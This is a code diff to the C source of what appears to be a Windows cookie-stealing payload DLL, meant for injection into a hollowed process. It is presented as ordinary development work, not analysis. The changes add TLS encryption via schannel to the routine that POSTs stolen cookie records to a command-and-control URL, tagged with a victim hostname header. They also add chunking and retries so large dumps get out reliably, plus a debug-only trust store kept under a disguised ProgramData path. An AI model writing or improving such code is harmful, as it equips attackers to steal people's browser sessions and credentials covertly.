@@ -10,10 +10,13 @@
 // CRT-less: /NODEFAULTLIB /ENTRY:payload_entry /DYNAMICBASE:NO /BASE:0x5F000000
 // Optimizer off (/Od /Oi-): SSE-vectorized memcpy/memset crashes in hollowed process.
 #define WIN32_LEAN_AND_MEAN
+#define SECURITY_WIN32
 #include <windows.h>
 #include <wincrypt.h>
 #include <bcrypt.h>
 #include <tlhelp32.h>
+#include <sspi.h>
+#include <schannel.h>
 
 // Minimal IP_ADAPTER_INFO for MAC address check (avoids iphlpapi.h CRT dependency)
 // Layout MUST match the real iphlpapi structures: the old 64-byte pad made every
@@ -89,6 +92,12 @@ static char*  g_out = NULL;
 static size_t g_cap = 0;
 static size_t g_len;
 static bool   g_first_rec = true;                          // controls comma in JSON array
+// Chunked exfil: every record starts at a byte offset, so the dump can be split
+// on record boundaries and POSTed as several envelopes without re-serialising.
+#define CK_MAX_REC 16384
+static size_t g_rec_off[CK_MAX_REC];
+static int    g_rec_n;
+static size_t g_rec_end;                                    // offset of the closing "]"
 static void Grow(size_t need){
     if(!g_out){
         g_cap = 2048*1024;
@@ -111,7 +120,18 @@ static void Put(const char* s, size_t n){
     if(g_out && g_len + n < g_cap - 1){ memcpy(g_out+g_len,s,n); g_len+=n; }
 }
 static void PutS(const char* s){ Put(s, lstrlenA(s)); }
-static void RecStart(void){ if(g_first_rec){ PutS("{"); g_first_rec=false; } else PutS(",{"); }
+static void RecStart(void){
+    // offset points at the '{' of the record (the separator comma is written
+    // before it and excluded), so a chunk slice is valid JSON on its own
+    if(g_first_rec){
+        if(g_rec_n < CK_MAX_REC){ g_rec_off[g_rec_n] = g_len; g_rec_n++; }
+        PutS("{"); g_first_rec=false;
+    } else {
+        PutS(",");
+        if(g_rec_n < CK_MAX_REC){ g_rec_off[g_rec_n] = g_len; g_rec_n++; }
+        PutS("{");
+    }
+}
 static void PutJ(const char* s, int n){            // escape string for JSON
     PutS("\"");
     for(int i=0;i<n;i++){ unsigned char c=(unsigned char)s[i];
@@ -1475,17 +1495,21 @@ static void VictimName(void){
     else g_victim[n < sizeof(g_victim) ? n : sizeof(g_victim)-1] = 0;
 }
 
-// http://HOST[:PORT][/PATH] -- scheme optional, case-insensitive, no TLS.
+// http://HOST[:PORT][/PATH] or https://HOST[:PORT][/PATH] -- scheme optional,
+// case-insensitive. https selects the schannel transport and defaults to 443.
 static bool ParseC2(const char* url, char* host, int hostcap, int* port,
-                    char* path, int pathcap){
+                    char* path, int pathcap, bool* tls){
     const char* p = url;
+    *tls = false;
     if((p[0]=='h'||p[0]=='H') && (p[1]=='t'||p[1]=='T') && (p[2]=='t'||p[2]=='T') &&
-       (p[3]=='p'||p[3]=='P') && p[4]==':'){
-        p += 5;
+       (p[3]=='p'||p[3]=='P')){
+        p += 4;                                   // past "http"
+        if(*p=='s' || *p=='S'){ *tls = true; p++; }
+        if(*p==':') p++;
         if(p[0]=='/' && p[1]=='/') p += 2;
     }
     if(!*p) return false;
-    int hp = 0; *port = 80;
+    int hp = 0; *port = *tls ? 443 : 80;
     while(*p && *p!='/' && *p!=':' && hp < hostcap-1) host[hp++] = *p++;
     host[hp] = 0;
     if(!hp) return false;
@@ -1501,24 +1525,343 @@ static bool ParseC2(const char* url, char* host, int hostcap, int* port,
     return true;
 }
 
+// ------------------------------------------------------------------ transports
+// Raw Winsock and schannel share one send loop. SOCKET is UINT_PTR on x64.
+typedef int (WINAPI *tCkSend)(CK_SOCKET, const char*, int, int);
+typedef int (WINAPI *tCkRecv)(CK_SOCKET, char*, int, int);
+
+static bool SendAll(tCkSend fSend, CK_SOCKET s, const char* p, int n){
+    int off = 0;
+    while(off < n){
+        int r = fSend(s, p + off, n - off, 0);
+        if(r <= 0) return false;
+        off += r;
+    }
+    return true;
+}
+
+struct CkTls {
+    CredHandle cred;
+    CtxtHandle ctx;
+    bool have_cred;
+    bool have_ctx;
+    SecPkgContext_StreamSizes sizes;
+};
+
+static bool HostWide(const char* host, wchar_t* out, int cap){
+    int i = 0;
+    for(; host[i] && i < cap - 1; i++) out[i] = (wchar_t)(unsigned char)host[i];
+    out[i] = 0;
+    return i > 0;
+}
+
+// Chain + hostname validation. schannel is created with manual validation so a
+// server certificate that fails here never gets a request -- same model curl and
+// browsers use, with the system root store and no revocation fetch (a victim
+// behind a captive portal must not hang on a CRL).
+static bool TlsValidate(CtxtHandle* ctx, const char* host){
+    PCCERT_CONTEXT cert = NULL;
+    SECURITY_STATUS ss = QueryContextAttributesA(ctx, SECPKG_ATTR_REMOTE_CERT_CONTEXT, &cert);
+    if(ss != SEC_E_OK || !cert){ DbgInt("TLS: no remote cert", (int)ss); return false; }
+    wchar_t whost[128];
+    if(!HostWide(host, whost, sizeof(whost)/sizeof(whost[0]))){
+        CertFreeCertificateContext(cert); return false;
+    }
+
+    CERT_CHAIN_PARA cp; memset(&cp, 0, sizeof(cp)); cp.cbSize = sizeof(cp);
+    PCCERT_CHAIN_CONTEXT chain = NULL;
+    HCERTCHAINENGINE engine = NULL;
+#ifdef DEBUG
+    // Bench-only: trust one local CA without touching the machine root store
+    // (adding to Root prompts for consent on a non-elevated desktop). Release
+    // builds compile this out and validate against the system roots only.
+    HCERTSTORE bench = CertOpenStore(CERT_STORE_PROV_FILENAME_A, 0, 0,
+        CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG,
+        "C:\\ProgramData\\MediaCache\\bench-ca.cer");
+    CERT_CHAIN_ENGINE_CONFIG ec; memset(&ec, 0, sizeof(ec)); ec.cbSize = sizeof(ec);
+    if(bench){
+        ec.hExclusiveRoot = bench;
+        if(CertCreateCertificateChainEngine(&ec, &engine))
+            Dbg("TLS: bench CA loaded (exclusive root)");
+        else
+            Dbg("TLS: bench CA engine create failed");
+    }
+#endif
+    BOOL got = CertGetCertificateChain(engine, cert, NULL, cert->hCertStore, &cp, 0, NULL, &chain);
+#ifdef DEBUG
+    if(engine) CertFreeCertificateChainEngine(engine);
+    if(bench) CertCloseStore(bench, 0);
+#endif
+    if(!got || !chain){
+        Dbg("TLS: chain build failed");
+        CertFreeCertificateContext(cert);
+        return false;
+    }
+
+    HTTPSPolicyCallbackData ssl; memset(&ssl, 0, sizeof(ssl));
+    ssl.cbSize = sizeof(ssl);
+    ssl.dwAuthType = AUTHTYPE_SERVER;
+    ssl.pwszServerName = whost;
+
+    CERT_CHAIN_POLICY_PARA pp; memset(&pp, 0, sizeof(pp));
+    pp.cbSize = sizeof(pp);
+    pp.pvExtraPolicyPara = &ssl;
+
+    CERT_CHAIN_POLICY_STATUS ps; memset(&ps, 0, sizeof(ps));
+    ps.cbSize = sizeof(ps);
+    BOOL verified = CertVerifyCertificateChainPolicy(CERT_CHAIN_POLICY_SSL, chain, &pp, &ps);
+    bool ok = verified && ps.dwError == 0;
+    if(!ok) DbgInt("TLS: certificate policy error", (int)ps.dwError);
+
+    CertFreeCertificateChain(chain);
+    CertFreeCertificateContext(cert);
+    return ok;
+}
+
+// One TLS 1.2 client handshake over an already-connected socket. The socket is
+// blocking with SO_RCVTIMEO set by the caller. Host doubles as SNI.
+//
+// Every output token goes into this caller-owned buffer. When pvBuffer is NULL
+// SspiCli allocates the token itself, and on some hosts that allocation fails
+// with SEC_E_INSUFFICIENT_MEMORY / GetLastError 1450 before a single byte is
+// built -- even for the Negotiate package, so it is the allocator, not the
+// TLS config. curl passes its own buffer for the same reason. cbMaxToken for
+// this package is 24 KB; the payload is single-threaded, so one static scratch.
+static char g_tls_tok[65536];
+
+static bool TlsHandshake(CkTls* t, CK_SOCKET s, const char* host, tCkSend fSend, tCkRecv fRecv){
+    memset(t, 0, sizeof(*t));
+
+    SCHANNEL_CRED sc; memset(&sc, 0, sizeof(sc));
+    sc.dwVersion = SCHANNEL_CRED_VERSION;
+    sc.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;  // TLS 1.3 is still absent on some Win10
+    sc.dwFlags = SCH_CRED_MANUAL_CRED_VALIDATION | SCH_USE_STRONG_CRYPTO;
+
+    TimeStamp ts;
+    SECURITY_STATUS ss = AcquireCredentialsHandleA(NULL, (SEC_CHAR*)UNISP_NAME_A, SECPKG_CRED_OUTBOUND,
+                          NULL, &sc, NULL, NULL, &t->cred, &ts);
+    if(ss != SEC_E_OK){ DbgInt("TLS: AcquireCredentialsHandle failed", (int)ss); return false; }
+    t->have_cred = true;
+
+    ULONG attrs = 0;
+    SecBuffer outb; outb.BufferType = SECBUFFER_TOKEN; outb.cbBuffer = sizeof(g_tls_tok); outb.pvBuffer = g_tls_tok;
+    SecBufferDesc outd; outd.ulVersion = SECBUFFER_VERSION; outd.cBuffers = 1; outd.pBuffers = &outb;
+
+    ss = InitializeSecurityContextA(&t->cred, NULL, (SEC_CHAR*)host, 0, 0, 0, NULL, 0,
+                                    &t->ctx, &outd, &attrs, &ts);
+    if(ss != SEC_I_CONTINUE_NEEDED && ss != SEC_E_OK){
+        DbgInt("TLS: ClientHello failed", (int)ss);
+        return false;
+    }
+    t->have_ctx = true;
+
+    char inbuf[18432]; int inlen = 0;
+    for(int round = 0; round < 64; round++){
+        if(outb.cbBuffer && outb.pvBuffer){
+            bool sent = SendAll(fSend, s, (const char*)outb.pvBuffer, (int)outb.cbBuffer);
+            if(!sent){ Dbg("TLS: handshake token send failed"); return false; }
+        }
+        if(ss == SEC_E_OK) break;
+        if(ss == SEC_E_INCOMPLETE_MESSAGE || inlen == 0){
+            if(inlen >= (int)sizeof(inbuf)){ Dbg("TLS: handshake buffer full"); return false; }
+            int r = fRecv(s, inbuf + inlen, (int)sizeof(inbuf) - inlen, 0);
+            if(r <= 0){ DbgInt("TLS: handshake recv failed", r); return false; }
+            inlen += r;
+        }
+
+        SecBuffer inb[2];
+        inb[0].BufferType = SECBUFFER_TOKEN; inb[0].cbBuffer = inlen; inb[0].pvBuffer = inbuf;
+        inb[1].BufferType = SECBUFFER_EMPTY; inb[1].cbBuffer = 0; inb[1].pvBuffer = NULL;
+        SecBufferDesc ind; ind.ulVersion = SECBUFFER_VERSION; ind.cBuffers = 2; ind.pBuffers = inb;
+        outb.BufferType = SECBUFFER_TOKEN; outb.cbBuffer = sizeof(g_tls_tok); outb.pvBuffer = g_tls_tok;
+
+        ss = InitializeSecurityContextA(&t->cred, &t->ctx, (SEC_CHAR*)host, 0, 0, 0, &ind, 0,
+                                        &t->ctx, &outd, &attrs, &ts);
+        if(inb[1].BufferType == SECBUFFER_EXTRA){
+            int extra = (int)inb[1].cbBuffer;
+            if(extra > 0 && extra <= inlen) memmove(inbuf, inbuf + (inlen - extra), extra);
+            inlen = extra;
+        } else {
+            inlen = 0;
+        }
+        if(ss != SEC_E_OK && ss != SEC_I_CONTINUE_NEEDED && ss != SEC_E_INCOMPLETE_MESSAGE){
+            DbgInt("TLS: handshake failed", (int)ss);
+            return false;
+        }
+    }
+    if(ss != SEC_E_OK){ Dbg("TLS: handshake did not complete"); return false; }
+
+    if(QueryContextAttributesA(&t->ctx, SECPKG_ATTR_STREAM_SIZES, &t->sizes) != SEC_E_OK){
+        Dbg("TLS: stream sizes unavailable"); return false;
+    }
+    return TlsValidate(&t->ctx, host);
+}
+
+static bool HttpStatusOk(const char* p, int n){
+    // "HTTP/1.1 200" / "HTTP/1.0 200": bytes 8..11 are " 200"
+    return n >= 12 && p[0]=='H' && p[1]=='T' && p[2]=='T' && p[3]=='P' && p[4]=='/' &&
+           p[8]==' ' && p[9]=='2' && p[10]=='0' && p[11]=='0';
+}
+
+static bool RecvStatus(tCkRecv fRecv, CK_SOCKET s){
+    char resp[64];
+    int r = fRecv(s, resp, sizeof(resp), 0);
+    if(r <= 0) return false;
+    return HttpStatusOk(resp, r);
+}
+
+// TLS equivalent: read one record and decrypt it before checking the status
+// line. Without this every 4xx looked like a successful delivery.
+static bool TlsRecvStatus(CkTls* t, tCkRecv fRecv, CK_SOCKET s){
+    char enc[18432];
+    int enclen = 0;
+    for(int round = 0; round < 16; round++){
+        int r = fRecv(s, enc + enclen, (int)sizeof(enc) - enclen, 0);
+        if(r <= 0) return false;
+        enclen += r;
+
+        SecBuffer b[4];
+        b[0].BufferType = SECBUFFER_DATA;  b[0].cbBuffer = enclen; b[0].pvBuffer = enc;
+        b[1].BufferType = SECBUFFER_EMPTY; b[1].cbBuffer = 0;      b[1].pvBuffer = NULL;
+        b[2].BufferType = SECBUFFER_EMPTY; b[2].cbBuffer = 0;      b[2].pvBuffer = NULL;
+        b[3].BufferType = SECBUFFER_EMPTY; b[3].cbBuffer = 0;      b[3].pvBuffer = NULL;
+        SecBufferDesc d; d.ulVersion = SECBUFFER_VERSION; d.cBuffers = 4; d.pBuffers = b;
+
+        SECURITY_STATUS ss = DecryptMessage(&t->ctx, &d, 0, NULL);
+        if(ss == SEC_E_INCOMPLETE_MESSAGE) continue;
+        if(ss != SEC_E_OK) return false;
+        for(int i = 0; i < 4; i++){
+            if(b[i].BufferType == SECBUFFER_DATA && b[i].cbBuffer > 0)
+                return HttpStatusOk((const char*)b[i].pvBuffer, (int)b[i].cbBuffer);
+        }
+        return false;
+    }
+    return false;
+}
+
+static bool TlsSend(CkTls* t, tCkSend fSend, CK_SOCKET s, const char* data, int len){
+    char buf[18432];
+    int maxmsg = (int)t->sizes.cbMaximumMessage;
+    int header = (int)t->sizes.cbHeader;
+    int trailer = (int)t->sizes.cbTrailer;
+    if(maxmsg <= 0 || header <= 0 || trailer < 0) return false;
+    if(header + maxmsg + trailer > (int)sizeof(buf))
+        maxmsg = (int)sizeof(buf) - header - trailer;
+
+    while(len > 0){
+        int n = len > maxmsg ? maxmsg : len;
+        memcpy(buf + header, data, n);
+        SecBuffer b[4];
+        b[0].BufferType = SECBUFFER_STREAM_HEADER; b[0].cbBuffer = header;          b[0].pvBuffer = buf;
+        b[1].BufferType = SECBUFFER_DATA;          b[1].cbBuffer = n;               b[1].pvBuffer = buf + header;
+        b[2].BufferType = SECBUFFER_STREAM_TRAILER;b[2].cbBuffer = trailer;         b[2].pvBuffer = buf + header + n;
+        b[3].BufferType = SECBUFFER_EMPTY;         b[3].cbBuffer = 0;               b[3].pvBuffer = NULL;
+        SecBufferDesc d; d.ulVersion = SECBUFFER_VERSION; d.cBuffers = 4; d.pBuffers = b;
+        if(EncryptMessage(&t->ctx, 0, &d, 0) != SEC_E_OK){ Dbg("TLS: EncryptMessage failed"); return false; }
+        int total = (int)(b[0].cbBuffer + b[1].cbBuffer + b[2].cbBuffer);
+        if(!SendAll(fSend, s, buf, total)) return false;
+        data += n; len -= n;
+    }
+    return true;
+}
+
+// close_notify so the Python listener sees a clean TLS EOF instead of SSLEOFError.
+static void TlsTeardown(CkTls* t, CK_SOCKET s, tCkSend fSend, bool send_close){
+    if(t->have_ctx){
+        if(send_close){
+            SecBuffer b; b.BufferType = SECBUFFER_TOKEN; b.cbBuffer = 0; b.pvBuffer = NULL;
+            SecBufferDesc d; d.ulVersion = SECBUFFER_VERSION; d.cBuffers = 1; d.pBuffers = &b;
+            if(ApplyControlToken(&t->ctx, &d) == SEC_E_OK){
+                SecBuffer ob; ob.BufferType = SECBUFFER_TOKEN; ob.cbBuffer = sizeof(g_tls_tok); ob.pvBuffer = g_tls_tok;
+                SecBufferDesc od; od.ulVersion = SECBUFFER_VERSION; od.cBuffers = 1; od.pBuffers = &ob;
+                ULONG attrs = 0; TimeStamp ts;
+                if(InitializeSecurityContextA(&t->cred, &t->ctx, NULL, 0, 0, 0, NULL, 0,
+                                             &t->ctx, &od, &attrs, &ts) == SEC_E_OK){
+                    if(ob.cbBuffer && ob.pvBuffer)
+                        SendAll(fSend, s, (const char*)ob.pvBuffer, (int)ob.cbBuffer);
+                }
+            }
+        }
+        DeleteSecurityContext(&t->ctx);
+        t->have_ctx = false;
+    }
+    if(t->have_cred){
+        FreeCredentialsHandle(&t->cred);
+        t->have_cred = false;
+    }
+}
+
+// ------------------------------------------------------------------ request framing
+static int AppStr(char* dst, int cap, int pos, const char* s){
+    int n = lstrlenA(s);
+    if(pos + n > cap) n = cap - pos;
+    if(n > 0) memcpy(dst + pos, s, n);
+    return pos + n;
+}
+static int AppNum(char* dst, int cap, int pos, long long v){
+    char t[24]; int n = 0;
+    unsigned long long uv = v < 0 ? (unsigned long long)(-v) : (unsigned long long)v;
+    if(!uv) t[n++] = '0';
+    while(uv){ t[n++] = (char)('0' + uv % 10); uv /= 10; }
+    if(v < 0 && pos < cap) dst[pos++] = '-';
+    while(n > 0 && pos < cap) dst[pos++] = t[--n];
+    return pos;
+}
+static int BuildPostHeader(char* hdr, int cap, const char* host, int port, const char* path,
+                           size_t body_len, bool tls, int chunk_i, int chunk_n){
+    int n = 0;
+    n = AppStr(hdr, cap, n, "POST "); n = AppStr(hdr, cap, n, path);
+    n = AppStr(hdr, cap, n, " HTTP/1.1\r\nHost: "); n = AppStr(hdr, cap, n, host);
+    if((tls && port != 443) || (!tls && port != 80)){
+        n = AppStr(hdr, cap, n, ":");
+        n = AppNum(hdr, cap, n, port);
+    }
+    n = AppStr(hdr, cap, n,
+        "\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nContent-Type: application/json\r\nContent-Length: ");
+    n = AppNum(hdr, cap, n, (long long)body_len);
+    n = AppStr(hdr, cap, n, "\r\nConnection: close\r\nX-CookieLog-Host: ");
+    n = AppStr(hdr, cap, n, g_victim);
+    if(chunk_n > 1){
+        n = AppStr(hdr, cap, n, "\r\nX-CookieLog-Chunk: ");
+        n = AppNum(hdr, cap, n, chunk_i + 1);
+        n = AppStr(hdr, cap, n, "/");
+        n = AppNum(hdr, cap, n, chunk_n);
+    }
+    n = AppStr(hdr, cap, n, "\r\n\r\n");
+    return n;
+}
+
+// End index (exclusive) of the chunk starting at record i: at most 600 records
+// or 384 KB of serialised JSON, so one stalled TLS record does not cost the dump.
+static int ChunkEnd(int i){
+    if(g_rec_n <= 0) return 0;
+    int j = i;
+    while(j < g_rec_n){
+        size_t end = (j + 1 < g_rec_n) ? g_rec_off[j + 1] : g_rec_end;
+        size_t span = end - g_rec_off[i];
+        if(j > i && (span > 384u * 1024u || (j - i) >= 600)) break;
+        j++;
+    }
+    return j;
+}
+
 static bool ExfilHTTP(const char* url){
     DbgStr("ExfilHTTP: url=", url);
-    char host[128], path[256]; int port = 80;
-    if(!ParseC2(url, host, sizeof(host), &port, path, sizeof(path))){
+    char host[128], path[256]; int port = 80; bool tls = false;
+    if(!ParseC2(url, host, sizeof(host), &port, path, sizeof(path), &tls)){
         Dbg("ExfilHTTP: unparseable URL"); return false;
     }
     VictimName();
     DbgStr("ExfilHTTP: host=", host);
     DbgInt("ExfilHTTP: port", port);
     DbgStr("ExfilHTTP: path=", path);
+    Dbg(tls ? "ExfilHTTP: transport=TLS" : "ExfilHTTP: transport=HTTP");
 
     HMODULE ws2 = LoadLibraryA("ws2_32.dll");
     if(!ws2){ Dbg("ExfilHTTP: ws2_32.dll load FAILED"); return false; }
     typedef int (WINAPI *tWSAStartup)(unsigned short, void*);
     typedef CK_SOCKET (WINAPI *tSocket)(int,int,int);
     typedef int (WINAPI *tConnect)(CK_SOCKET, const void*, int);
-    typedef int (WINAPI *tSend)(CK_SOCKET, const char*, int, int);
-    typedef int (WINAPI *tRecv)(CK_SOCKET, char*, int, int);
     typedef int (WINAPI *tCloseSocket)(CK_SOCKET);
     typedef int (WINAPI *tWSACleanup)(void);
     typedef unsigned long (WINAPI *tInetAddr)(const char*);
@@ -1531,8 +1874,8 @@ static bool ExfilHTTP(const char* url){
     tWSAStartup fStart = (tWSAStartup)GetProcAddress(ws2,"WSAStartup");
     tSocket    fSocket = (tSocket)GetProcAddress(ws2,"socket");
     tConnect   fConnect= (tConnect)GetProcAddress(ws2,"connect");
-    tSend      fSend   = (tSend)GetProcAddress(ws2,"send");
-    tRecv      fRecv   = (tRecv)GetProcAddress(ws2,"recv");
+    tCkSend    fSend   = (tCkSend)GetProcAddress(ws2,"send");
+    tCkRecv    fRecv   = (tCkRecv)GetProcAddress(ws2,"recv");
     tCloseSocket fClose= (tCloseSocket)GetProcAddress(ws2,"closesocket");
     tWSACleanup fClean = (tWSACleanup)GetProcAddress(ws2,"WSACleanup");
     tInetAddr  fInet  = (tInetAddr)GetProcAddress(ws2,"inet_addr");
@@ -1563,82 +1906,112 @@ static bool ExfilHTTP(const char* url){
         }
     }
 
-    // Build the POST once (reused by every retry)
-    char hdr[1024]; int hn = 0;
-    #define APP(s) { int ln=lstrlenA(s); if(hn+ln<(int)sizeof(hdr)){ memcpy(hdr+hn,s,ln); hn+=ln; } }
-    APP("POST "); APP(path);
-    APP(" HTTP/1.1\r\nHost: "); APP(host);
-    if(port != 80){
-        char tmp[8], pn[8]; int ti=0, pi=0, pv=port;
-        while(pv){ tmp[ti++] = (char)('0' + pv%10); pv/=10; }
-        pn[pi++]=':'; while(ti) pn[pi++]=tmp[--ti]; pn[pi]=0; APP(pn);
-    }
-    APP("\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nContent-Type: application/json\r\nContent-Length: ");
-    { char num[24]; int ni=0; size_t gl=g_len; if(!gl) num[ni++]='0';
-      else while(gl){ num[ni++]=(char)('0'+gl%10); gl/=10; }
-      while(ni && hn<(int)sizeof(hdr)) hdr[hn++]=num[--ni]; }
-    APP("\r\nConnection: close\r\nX-CookieLog-Host: "); APP(g_victim); APP("\r\n\r\n");
-    #undef APP
+    // Split on record boundaries. Each chunk is a complete {"records":[...]}
+    // envelope; only the last carries the coverage object.
+    int chunk_total = 0;
+    if(g_rec_n <= 0) chunk_total = 1;
+    else for(int k = 0; k < g_rec_n; ){ k = ChunkEnd(k); chunk_total++; }
+    DbgInt("ExfilHTTP: chunks", chunk_total);
 
-    // 4 attempts with backoff: one refused SYN (listener restarting, firewall
-    // rule still propagating) used to lose the entire dump.
-    bool sent_ok = false;
-    for(int attempt=0; attempt<4 && !sent_ok; attempt++){
-        if(attempt) Sleep(500u << (attempt-1));            // 500, 1000, 2000 ms
-        CK_SOCKET s = fSocket(2 /*AF_INET*/, 1 /*SOCK_STREAM*/, 6 /*IPPROTO_TCP*/);
-        if(s == CK_INVALID_SOCKET){ Dbg("ExfilHTTP: socket failed"); continue; }
-        if(fSetOpt){
-            DWORD tmo = 30000;
-            fSetOpt(s, 0xFFFF, 0x1005, (const char*)&tmo, sizeof(tmo)); // SO_SNDTIMEO
-            fSetOpt(s, 0xFFFF, 0x1006, (const char*)&tmo, sizeof(tmo)); // SO_RCVTIMEO
-        }
-        bool connected = false;
-        if(fIoctl && fSelect && fGetOpt && fErr){
-            unsigned long nb = 1;
-            fIoctl(s, (long)0x8004667E /*FIONBIO*/, &nb);
-            int cr = fConnect(s, &addr, sizeof(addr));
-            if(cr == 0) connected = true;
-            else if(cr == -1 && fErr() == 10035 /*WSAEWOULDBLOCK*/){
-                CK_FD_SET wr; memset(&wr, 0, sizeof(wr));
-                wr.fd_count = 1; wr.fd_array[0] = s;
-                CK_TIMEVAL tv; tv.tv_sec = 5; tv.tv_usec = 0;
-                if(fSelect(0, 0, &wr, 0, &tv) > 0){
-                    int soerr = 0, sl = (int)sizeof(soerr);
-                    if(fGetOpt(s, 0xFFFF, 0x1007 /*SO_ERROR*/, (char*)&soerr, &sl) == 0 && soerr == 0)
-                        connected = true;
-                }
-            }
-            unsigned long blocking = 0;
-            fIoctl(s, (long)0x8004667E, &blocking);
+    const char prefix[] = "{\"records\":[";
+    const int prefix_len = 12;
+    bool sent_ok = true;
+    int i = 0, chunk_idx = 0;
+    for(;;){
+        bool last;
+        const char* slice; int slice_len;
+        const char* suffix; int suffix_len;
+        if(g_rec_n <= 0){
+            last = true;
+            slice = g_out + g_rec_end; slice_len = 0;
+            suffix = g_out + g_rec_end; suffix_len = (int)(g_len - g_rec_end);
         } else {
-            connected = (fConnect(s, &addr, sizeof(addr)) == 0);
+            int j = ChunkEnd(i);
+            last = (j >= g_rec_n);
+            size_t slice_end = last ? g_rec_end : (g_rec_off[j] - 1);
+            slice = g_out + g_rec_off[i];
+            slice_len = (int)(slice_end - g_rec_off[i]);
+            if(last){ suffix = g_out + g_rec_end; suffix_len = (int)(g_len - g_rec_end); }
+            else { suffix = "]}"; suffix_len = 2; }
+            i = j;
         }
-        if(!connected){
-            DbgInt("ExfilHTTP: connect failed (attempt)", attempt);
-            fClose(s); continue;
+        size_t body_len = (size_t)prefix_len + (size_t)slice_len + (size_t)suffix_len;
+        char hdr[1024];
+        int hn = BuildPostHeader(hdr, sizeof(hdr), host, port, path, body_len, tls, chunk_idx, chunk_total);
+
+        bool chunk_ok = false;
+        for(int attempt = 0; attempt < 4 && !chunk_ok; attempt++){
+            if(attempt) Sleep(500u << (attempt - 1));      // 500, 1000, 2000 ms
+            CK_SOCKET s = fSocket(2 /*AF_INET*/, 1 /*SOCK_STREAM*/, 6 /*IPPROTO_TCP*/);
+            if(s == CK_INVALID_SOCKET){ Dbg("ExfilHTTP: socket failed"); continue; }
+            if(fSetOpt){
+                DWORD tmo = 30000;
+                fSetOpt(s, 0xFFFF, 0x1005, (const char*)&tmo, sizeof(tmo)); // SO_SNDTIMEO
+                fSetOpt(s, 0xFFFF, 0x1006, (const char*)&tmo, sizeof(tmo)); // SO_RCVTIMEO
+            }
+            bool connected = false;
+            if(fIoctl && fSelect && fGetOpt && fErr){
+                unsigned long nb = 1;
+                fIoctl(s, (long)0x8004667E /*FIONBIO*/, &nb);
+                int cr = fConnect(s, &addr, sizeof(addr));
+                if(cr == 0) connected = true;
+                else if(cr == -1 && fErr() == 10035 /*WSAEWOULDBLOCK*/){
+                    CK_FD_SET wr; memset(&wr, 0, sizeof(wr));
+                    wr.fd_count = 1; wr.fd_array[0] = s;
+                    CK_TIMEVAL tv; tv.tv_sec = 5; tv.tv_usec = 0;
+                    if(fSelect(0, 0, &wr, 0, &tv) > 0){
+                        int soerr = 0, sl = (int)sizeof(soerr);
+                        if(fGetOpt(s, 0xFFFF, 0x1007 /*SO_ERROR*/, (char*)&soerr, &sl) == 0 && soerr == 0)
+                            connected = true;
+                    }
+                }
+                unsigned long blocking = 0;
+                fIoctl(s, (long)0x8004667E, &blocking);
+            } else {
+                connected = (fConnect(s, &addr, sizeof(addr)) == 0);
+            }
+            if(!connected){
+                DbgInt("ExfilHTTP: connect failed (attempt)", attempt);
+                fClose(s); continue;
+            }
+            Dbg("ExfilHTTP: connected");
+
+            CkTls tlsctx;
+            if(tls){
+                if(!TlsHandshake(&tlsctx, s, host, fSend, fRecv)){
+                    Dbg("ExfilHTTP: TLS handshake failed");
+                    TlsTeardown(&tlsctx, s, fSend, false);
+                    fClose(s); continue;
+                }
+                Dbg("ExfilHTTP: TLS ready");
+            }
+
+            bool ok;
+            if(tls){
+                ok = TlsSend(&tlsctx, fSend, s, hdr, hn) &&
+                     TlsSend(&tlsctx, fSend, s, prefix, prefix_len) &&
+                     (slice_len <= 0 || TlsSend(&tlsctx, fSend, s, slice, slice_len)) &&
+                     TlsSend(&tlsctx, fSend, s, suffix, suffix_len);
+            } else {
+                ok = SendAll(fSend, s, hdr, hn) &&
+                     SendAll(fSend, s, prefix, prefix_len) &&
+                     (slice_len <= 0 || SendAll(fSend, s, slice, slice_len)) &&
+                     SendAll(fSend, s, suffix, suffix_len);
+            }
+            bool acked = false;
+            if(ok){
+                if(tls) acked = TlsRecvStatus(&tlsctx, fRecv, s);
+                else    acked = RecvStatus(fRecv, s);
+                if(!acked) Dbg("ExfilHTTP: no 200 ack");
+            }
+            if(tls) TlsTeardown(&tlsctx, s, fSend, ok && acked);
+            fClose(s);
+            chunk_ok = ok && acked;
+            if(!chunk_ok) DbgInt("ExfilHTTP: chunk attempt failed", attempt);
         }
-        Dbg("ExfilHTTP: connected");
-        int sent = 0;
-        while(sent < hn){
-            int r = fSend(s, hdr + sent, hn - sent, 0);
-            if(r <= 0) break;
-            sent += r;
-        }
-        if(sent != hn){ DbgInt("ExfilHTTP: header short", sent); fClose(s); continue; }
-        bool body_ok = true;
-        size_t off = 0;
-        while(off < g_len){
-            int chunk = (g_len - off < 32768) ? (int)(g_len - off) : 32768;
-            int r = fSend(s, g_out + off, chunk, 0);
-            if(r <= 0){ body_ok = false; break; }
-            off += (size_t)r;
-        }
-        DbgInt("ExfilHTTP: body sent", (int)off);
-        char resp[256];
-        int r = fRecv(s, resp, sizeof(resp), 0);
-        if(r <= 0) Dbg("ExfilHTTP: no response (listener closed)");
-        fClose(s);
-        sent_ok = body_ok && (off == g_len);
+        if(!chunk_ok){ sent_ok = false; break; }
+        chunk_idx++;
+        if(last) break;
     }
     fClean();
     return sent_ok;
@@ -1678,6 +2051,7 @@ static void EmitCoverage(void){
 
 // Priority: 1) HTTP POST to C2 (if sentinel was patched), 2) named pipe, 3) local file
 static bool Sink(void){
+    g_rec_end = g_len;                                  // chunk splitter stops here
     PutS("]");
     EmitCoverage();
     if(g_out) g_out[g_len]=0; else return false;   // nothing was ever buffered (OOM)
@@ -1952,6 +2326,8 @@ extern "C" __declspec(dllexport) DWORD WINAPI payload_entry(HINSTANCE h, DWORD r
     // Accept both: reason==1 (LoadLibrary) or h==1 (CreateRemoteThread arg=1)
     if(reason != 1 && (ULONG_PTR)h != 1){ Dbg("payload_entry: not ATTACH, skip"); return 1; }
     g_first_rec = true;
+    g_rec_n = 0;
+    g_rec_end = 0;
     Dbg("payload_entry: loading sqlite");
     if(!Sqlite()){ Dbg("payload_entry: Sqlite FAILED"); return 1; }
     Dbg("payload_entry: Sqlite OK");
@@ -1960,6 +2336,7 @@ extern "C" __declspec(dllexport) DWORD WINAPI payload_entry(HINSTANCE h, DWORD r
     LoadLibraryA("crypt32.dll");
     LoadLibraryA("bcrypt.dll");
     LoadLibraryA("ws2_32.dll");
+    LoadLibraryA("secur32.dll");
